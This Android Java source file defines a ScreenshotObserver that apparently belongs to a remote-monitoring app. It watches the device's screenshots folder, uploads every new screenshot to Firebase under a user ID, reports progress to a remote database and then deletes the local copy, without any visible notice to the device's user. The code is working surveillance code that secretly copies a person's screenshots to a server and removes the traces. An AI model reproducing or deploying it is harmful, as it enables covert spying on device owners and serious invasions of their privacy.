package com.reiserx.testtrace.Screenshot;

import android.net.Uri;
import android.os.Environment;
import android.os.FileObserver;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Models.TaskSuccess;
import com.reiserx.testtrace.Models.downloadUrl;

import java.io.File;
import java.util.Calendar;

public class ScreenshotObserver {

    String TAG = "Screenshot.ScreenshotOberver.logs";

    public void Observer(String UserID, TaskSuccess taskSuccess, DatabaseReference references) {
        String path;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            path = Environment.getExternalStorageDirectory() + File.separator + Environment.DIRECTORY_DCIM + File.separator + Environment.DIRECTORY_SCREENSHOTS;
        } else {
            path = Environment.getExternalStorageDirectory() + File.separator + Environment.DIRECTORY_DCIM + File.separator + "Screenshots";
        }
        Log.d(TAG, path);

        String finalPath = path;
        FileObserver fileObserver = new FileObserver(finalPath, FileObserver.CREATE) {
            @Override
            public void onEvent(int event, String paths) {
                Log.d(TAG, event + " " + paths);
                taskSuccess.setMessage("Screenshot captured");
                taskSuccess.setSuccess(true);
                references.setValue(taskSuccess);
                File file = new File(finalPath +"/"+paths);
                StorageReference reference = FirebaseStorage.getInstance().getReference().child("Main").child(UserID).child("ScreenShots").child(file.getName());
                DocumentReference collectionReference = FirebaseFirestore.getInstance().collection("Main").document(UserID).collection("ScreenShots").document(file.getName());

                taskSuccess.setMessage("Uploading to server");
                taskSuccess.setSuccess(true);
                references.setValue(taskSuccess);

                reference.putFile(Uri.fromFile(file)).addOnCompleteListener(task -> {
                    Log.d(TAG, "uploading");
                    if (task.isSuccessful()) {
                        reference.getDownloadUrl().addOnSuccessListener(uri -> {
                            Log.d(TAG, "getting url");
                            taskSuccess.setMessage("Uploading to server");
                            taskSuccess.setSuccess(true);
                            references.setValue(taskSuccess);
                            Calendar cal = Calendar.getInstance();
                            long currentTime = cal.getTimeInMillis();
                            downloadUrl downloadUrl = new downloadUrl(uri.toString(), currentTime);
                            collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> {
                                Log.d(TAG, String.valueOf(reference1));
                                taskSuccess.setMessage("Upload successful");
                                taskSuccess.setSuccess(true);
                                taskSuccess.setFinal(true);
                                references.setValue(taskSuccess);
                            });
                            file.delete();
                        });
                    } else {
                        Log.d(TAG, task.getException().toString());
                        ExceptionHandler exceptionHandler = new ExceptionHandler(task.getException(), UserID);
                        exceptionHandler.upload();
                    }
                });
            }
        };

        fileObserver.startWatching();
    }
}
